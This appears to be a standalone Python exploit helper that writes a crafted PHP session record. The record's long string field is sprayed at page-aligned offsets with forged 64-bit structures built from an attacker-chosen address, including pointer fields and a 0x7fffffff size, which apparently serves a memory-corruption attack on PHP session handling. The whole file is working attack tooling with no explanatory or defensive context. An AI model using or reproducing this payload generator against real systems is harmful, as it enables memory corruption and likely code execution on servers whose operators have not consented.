#!/usr/bin/env python3
import struct,sys
SMALL=b'S'*32
def build(P,total,used=0,fill=0x41):
    head=b'S|s:%d:"'%len(SMALL)+SMALL+b'";'+b'J|i:4096;'
    L=total-len(head)-len('K|s:"')-2-1
    for _ in range(12):
        hdr=b'K|s:%d:"'%L; want=total-len(head)-len(hdr)-2
        if want==L: break
        L=want
    hdr=b'K|s:%d:"'%L
    blob=bytearray([fill])*L; boff=len(head)+len(hdr)
    # file offset o maps to data val + o. Put a copy for every page-aligned P-val offset.
    for addr_off in range(0x1000,total,0x1000):
        file_off=addr_off-24
        b=file_off-boff
        if b<0 or b+0x90>L: continue
        for off,val in ((0,P+56),(8,0),(16,P+0x80),(24,0),(32,0),(40,0),(48,0x7fffffff),(56,0),(64,0)):
            blob[b+off:b+off+8]=struct.pack('<Q',val&0xffffffffffffffff)
        blob[b+0x80:b+0x88]=struct.pack('<Q',used&0xffffffffffffffff)
        blob[b+0x88:b+0x90]=struct.pack('<Q',0)
    rec=head+hdr+bytes(blob)+b'";'
    assert len(rec)==total,(len(rec),total)
    return rec,len(head),len(hdr),L
if __name__=='__main__':
    P=int(sys.argv[1],0); out=sys.argv[2]; total=int(sys.argv[3]); used=int(sys.argv[4],0) if len(sys.argv)>4 else 0
    rec,hl,kl,L=build(P,total,used); open(out,'wb').write(rec)
    print('P=%#x total=%d head=%d khdr=%d L=%d'%(P,len(rec),hl,kl,L))
